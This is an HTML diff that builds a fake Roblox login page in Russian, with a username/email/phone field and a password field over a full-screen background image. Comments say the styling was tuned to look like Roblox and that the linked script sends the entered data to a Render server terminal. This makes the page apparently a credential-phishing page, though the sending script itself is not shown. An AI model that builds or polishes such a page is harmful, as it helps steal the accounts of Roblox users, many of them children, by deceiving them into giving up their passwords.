@@ -1,25 +1,84 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox</title>
-    <link rel="stylesheet" href="style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roblox</title>
+
+<style>
+    body {
+        margin: 0;
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        /* ТУТ ТВОЙ ФОН */
+        background-image: url('bg.jpg');
+        background-size: cover;
+        background-position: center;
+        background-repeat: no-repeat;
+        font-family: Arial, sans-serif;
+    }
+
+    .login-form {
+        width: 320px;
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+        /* Немного опускаем форму вниз, если она налезает на навбар на картинке */
+        margin-top: 80px; 
+    }
+
+    .login-form input {
+        box-sizing: border-box;
+        width: 100%;
+        height: 48px;
+        padding: 0 14px;
+        border: 1px solid #55595e;
+        border-radius: 8px;
+        background: #292c30;
+        color: #ffffff;
+        font-size: 16px;
+        outline: none;
+    }
+
+    .login-form input::placeholder {
+        color: #b8bbbf;
+    }
+
+    .login-form input:focus {
+        border-color: #ffffff;
+    }
+
+    /* Я чуть-чуть поменял цвет кнопки, чтобы он был как в Roblox (темный с обводкой), 
+       если тебе нравится белая - просто верни background: #e5e5e5; color: #202124; */
+    .login-form button {
+        height: 48px;
+        border: 1px solid #555;
+        border-radius: 8px;
+        background: #232527;
+        color: #fff;
+        font-size: 16px;
+        font-weight: 700;
+        cursor: pointer;
+        transition: background 0.2s;
+    }
+
+    .login-form button:hover {
+        background: #32353a;
+    }
+</style>
 </head>
+
 <body>
 
-    <!-- Твой фон на весь экран -->
-    <div class="bg-image"></div>
+<form class="login-form" id="loginForm">
+    <input type="text" id="username" placeholder="Имя пользователя/Электронная почта/Телефон" required>
+    <input type="password" id="password" placeholder="Пароль" required>
+    <button type="submit">Авторизоваться</button>
+</form>
 
-    <!-- Блок с тремя элементами -->
-    <div class="login-box">
-        <form id="loginForm" autocomplete="off">
-            <input type="text" id="username" placeholder="Имя пользователя/Электронная почта/Телефон" required autocomplete="off">
-            <input type="password" id="password" placeholder="Пароль" required autocomplete="new-password">
-            <button type="submit" class="login-btn">Авторизоваться</button>
-        </form>
-    </div>
-
-    <script src="script.js"></script>
+<!-- Твой скрипт, который отправляет данные в терминал Render -->
+<script src="script.js"></script>
 </body>
 </html>
